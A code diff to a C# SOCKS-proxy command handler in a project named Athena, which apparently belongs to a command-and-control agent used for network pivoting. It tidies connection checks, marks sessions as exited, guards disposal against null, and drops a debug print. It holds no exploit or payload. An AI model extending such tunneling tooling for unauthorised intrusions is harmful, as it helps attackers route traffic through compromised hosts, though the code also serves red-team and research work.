@@ -48,7 +48,7 @@ namespace Athena.Commands
 
             if (!String.IsNullOrEmpty(sm.data)) //If the packet contains data we can do something with it
             {
-                if (this.connections[sm.server_id].client.IsConnected) //Check if our connection is alive
+                if (this.connections[sm.server_id].IsConnected()) //Check if our connection is alive
                 {
                     this.connections[sm.server_id].client.Send(Misc.Base64DecodeToByteArray(sm.data)); //The connection is open still, let's send the packet
                 }
@@ -56,14 +56,18 @@ namespace Athena.Commands
 
             if (sm.exit) //Finally, let's see if exit was set to true
             {
-                if (this.connections[sm.server_id].client.IsConnected) //Are we still connected and need to initiate a disconnect?
+                if (this.connections[sm.server_id].IsConnected())
                 {
+                    this.connections[sm.server_id].exited = true;
                     this.connections[sm.server_id].client.Disconnect(); //We are, so let's issue the disconnect
                 }
                 AthenaSocksConnection ac;
                 if (this.connections.TryRemove(sm.server_id, out ac))//Finally, remove the session from our tracker and dispose of the client
                 {
-                    ac.client.Dispose();
+                    if(ac.client is not null)
+                    {
+                        ac.client.Dispose();
+                    }
                 }
             }
         }
@@ -125,7 +129,6 @@ namespace Athena.Commands
             foreach (var conn in this.connections)
             {
                 List<SocksMessage> returnMessages = conn.Value.GetMessages();
-                Console.WriteLine($"[{DateTime.Now}] Adding: {returnMessages.Count()}");
                 foreach (var msg in returnMessages)
                 {
                     SocksResponseHandler.AddSocksMessageAsync(msg);
